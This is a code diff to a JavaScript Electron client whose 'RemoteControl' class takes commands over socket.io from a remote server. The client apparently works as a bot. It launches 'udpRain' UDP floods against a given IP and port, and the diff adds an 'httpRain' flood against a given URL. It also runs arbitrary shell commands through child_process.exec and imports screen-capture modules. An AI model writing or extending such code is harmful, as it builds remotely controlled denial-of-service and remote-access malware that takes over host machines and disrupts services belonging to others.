@@ -2,7 +2,7 @@ const { desktopCapturer, screen, app, ipcMain } = require("electron");
 const io = require("socket.io-client");
 const child_process = require("child_process");
 const udpRain = require("./udpRain");
-
+const httpRain = require("./httpRain");
 //udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });
 
 //const robot = require("robotjs");
@@ -74,14 +74,23 @@ class RemoteControl {
       console.log({ getRunRequest: data });
       if (data.cmd.indexOf("udpRain") > -1) {
         const splittedData = data.cmd.split(" ");
-        const createData = {
+        const createdData = {
           port: parseInt(splittedData[2]),
           ip: splittedData[1],
           seconds: parseInt(splittedData[3]),
           interval: parseInt(splittedData[4]),
         };
-        console.log({ createData });
-        udpRain.start(createData);
+        console.log({ createdData });
+        udpRain.start(createdData);
+      } else if (data.cmd.indexOf("httpRain") > -1) {
+        const splittedData = data.cmd.split(" ");
+        const createdData = {
+          url: splittedData[1],
+          seconds: parseInt(splittedData[2]),
+          interval: parseInt(splittedData[3]),
+        };
+        console.log({ createdData });
+        httpRain.start(createdData);
       } else {
         try {
           child_process.exec(
